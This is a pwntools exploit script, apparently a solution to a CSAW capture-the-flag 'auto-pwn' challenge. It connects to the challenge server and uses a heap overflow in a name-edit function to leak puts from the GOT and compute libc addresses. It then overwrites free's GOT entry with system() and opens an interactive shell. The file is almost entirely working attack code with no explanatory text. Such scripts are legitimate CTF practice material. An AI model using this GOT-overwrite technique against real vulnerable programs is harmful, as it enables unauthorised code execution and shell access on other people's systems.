from pwn import *

if __name__=='__main__':
#  io = process('./binary_21_patched')
  io = remote('auto-pwn.chal.csaw.io',11021)
  exe = ELF('./binary_21_patched')

  io.sendlineafter(b'> ',b'13462b403d91edd8c8389517c1eca3ed')

  io.recvuntil(b'3) Exit')
#  print(b'AAAAAAAAAAAAAAAAAAAAAAAAAA = ' + show(2))

  def edit(idx,data):
    io.sendlineafter(b': ',b'1')
    io.sendlineafter(b': ',f'{idx}'.encode())
    io.sendlineafter(b'? ',f'{len(data)+1}'.encode())
    io.sendafter(b'name: ',data)

  def show(idx):
    io.sendlineafter(b': ',b'2')
    io.sendlineafter(b': ',f'{idx}'.encode())
    io.recvline()
    return io.recvline().split(b': ')[1].strip()

  edit(1,
    flat([
      b'/bin/sh\0', 0, 0, 0, 0,
      0x61, 0, 0, 0, 0, 0, 0, 0,
      0x4b43704a76000000, 0x7175596d6e754947,
      0x90ffffff614d766d, 0x00000968fa1e0ff3,
      0x41, 0, 0, 0, 0, 0, 0,
      exe.got['puts'], 0x31
    ]
    ,arch='amd64')
  )

  libc_base = u64(show(2) + b'\0\0') - 0x68f90
  libc_system = libc_base + 0x3f480
  print(f'Libc base: {hex(libc_base)}')

  edit(1,
    flat([
      b'/bin/sh\0', 0, 0, 0, 0,
      0x61, 0, 0, 0, 0, 0, 0, 0,
      0x4b43704a76000000, 0x7175596d6e754947,
      0x90ffffff614d766d, 0x00000968fa1e0ff3,
      0x41, 0, 0, 0, 0, 0, 0,
      exe.got['free'], 0x31
    ]
    ,arch='amd64')
  )
  edit(2, p64(libc_system))
  pause()
  io.sendlineafter(b': ','3')

  io.interactive()
